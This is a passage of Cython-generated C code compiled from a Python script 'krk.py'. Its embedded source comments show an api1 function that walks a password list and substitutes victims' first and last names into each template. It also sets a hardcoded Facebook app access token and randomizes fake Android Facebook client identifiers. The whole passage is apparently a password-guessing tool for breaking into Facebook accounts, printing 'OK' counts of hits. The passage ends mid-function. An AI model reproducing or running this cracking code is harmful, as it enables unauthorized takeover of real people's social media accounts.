    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_3};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 528, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 528, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":488
 *         except Exception as e:
 *                 pass
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */

static PyObject *__pyx_pf_3krk_16api1(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist) {
  PyObject *__pyx_v_fn = NULL;
  PyObject *__pyx_v_ln = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_pas = NULL;
  PyObject *__pyx_v_accessToken = NULL;
  PyObject *__pyx_v_fbav = NULL;
  PyObject *__pyx_v_fbbv = NULL;
  PyObject *__pyx_v_android_version = NULL;
  PyObject *__pyx_v_model = NULL;
  PyObject *__pyx_v_build = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fblc = NULL;
  PyObject *__pyx_v_fbcr = NULL;
  PyObject *__pyx_v_fbmf = NULL;
  PyObject *__pyx_v_fbbd = NULL;
  PyObject *__pyx_v_fbdv = NULL;
  PyObject *__pyx_v_fbsv = NULL;
  PyObject *__pyx_v_fbca = NULL;
  PyObject *__pyx_v_fbdm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbfw = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbrv = NULL;
  PyObject *__pyx_v_fban = NULL;
  PyObject *__pyx_v_fbpn = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_random_seed = NULL;
  PyObject *__pyx_v_adid = NULL;
  PyObject *__pyx_v_device_id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_secure = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_family = NULL;
  PyObject *__pyx_v_xd = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_sim_serials = NULL;
  PyObject *__pyx_v_li = NULL;
  PyObject *__pyx_v_li2 = NULL;
  PyObject *__pyx_v_j1 = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_jazoest = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_twf = NULL;
  PyObject *__pyx_v_po = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_gb_3krk_4api1_2generator5 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *(*__pyx_t_14)(PyObject *);
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  Py_ssize_t __pyx_t_21;
  Py_UCS4 __pyx_t_22;
  int __pyx_t_23;
  int __pyx_t_24;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("api1", 0);

  /* "krk.py":489
 *                 pass
 * def api1(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "krk.py":491
 *         try:
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()             # <<<<<<<<<<<<<<
 *                 fn = names.split(' ')[0]
 *                 try:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_loop); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_oks); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = PyTuple_New(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_9, 1, __pyx_t_7);
      __pyx_t_6 = 0;
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3, __pyx_t_9); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_10 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_t_7};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 491, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 491, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_10 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_7, };
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 491, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "krk.py":492
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]             # <<<<<<<<<<<<<<
 *                 try:
 *                         ln = names.split(' ')[1]
 */
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 492, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_10 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_kp_s__22};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 492, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 492, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_fn = __pyx_t_5;
      __pyx_t_5 = 0;

      /* "krk.py":493
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          /* "krk.py":494
 *                 fn = names.split(' ')[0]
 *                 try:
 *                         ln = names.split(' ')[1]             # <<<<<<<<<<<<<<
 *                 except:
 *                         ln = fn
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 494, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_7 = NULL;
          __pyx_t_10 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_10 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_kp_s__22};
            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 494, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 494, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_v_ln = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":493
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

        /* "krk.py":495
 *                 try:
 *                         ln = names.split(' ')[1]
 *                 except:             # <<<<<<<<<<<<<<
 *                         ln = fn
 *                 for pw in passlist:
 */
        /*except:*/ {
          __Pyx_AddTraceback("krk.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_7) < 0) __PYX_ERR(0, 495, __pyx_L11_except_error)
          __Pyx_XGOTREF(__pyx_t_4);
          __Pyx_XGOTREF(__pyx_t_5);
          __Pyx_XGOTREF(__pyx_t_7);

          /* "krk.py":496
 *                         ln = names.split(' ')[1]
 *                 except:
 *                         ln = fn             # <<<<<<<<<<<<<<
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 */
          __Pyx_INCREF(__pyx_v_fn);
          __Pyx_XDECREF_SET(__pyx_v_ln, __pyx_v_fn);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          goto __pyx_L10_exception_handled;
        }

        /* "krk.py":493
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        __pyx_L11_except_error:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L14_try_end:;
      }

      /* "krk.py":497
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_7 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_7); __pyx_t_8 = 0;
        __pyx_t_14 = NULL;
      } else {
        __pyx_t_8 = -1; __pyx_t_7 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 497, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_14 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_7); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 497, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_14)) {
          if (likely(PyList_CheckExact(__pyx_t_7))) {
            if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_7)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyList_GET_ITEM(__pyx_t_7, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 497, __pyx_L3_error)
            #else
            __pyx_t_5 = PySequence_ITEM(__pyx_t_7, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 497, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          } else {
            if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_7)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_7, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 497, __pyx_L3_error)
            #else
            __pyx_t_5 = PySequence_ITEM(__pyx_t_7, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 497, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          }
        } else {
          __pyx_t_5 = __pyx_t_14(__pyx_t_7);
          if (unlikely(!__pyx_t_5)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 497, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_5);
        }
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":498
 *                         ln = fn
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 */
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_fn, __pyx_n_s_lower); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_19);
        __pyx_t_20 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_19))) {
          __pyx_t_20 = PyMethod_GET_SELF(__pyx_t_19);
          if (likely(__pyx_t_20)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_20);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_19, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_20, };
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_19, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        }
        __pyx_t_19 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_19, __pyx_n_s_first, __pyx_t_18};
          __pyx_t_16 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_16, __pyx_n_s_First, __pyx_v_fn};
          __pyx_t_15 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_ln, __pyx_n_s_lower); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_18 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_18, };
          __pyx_t_15 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        }
        __pyx_t_16 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_16, __pyx_n_s_last, __pyx_t_15};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
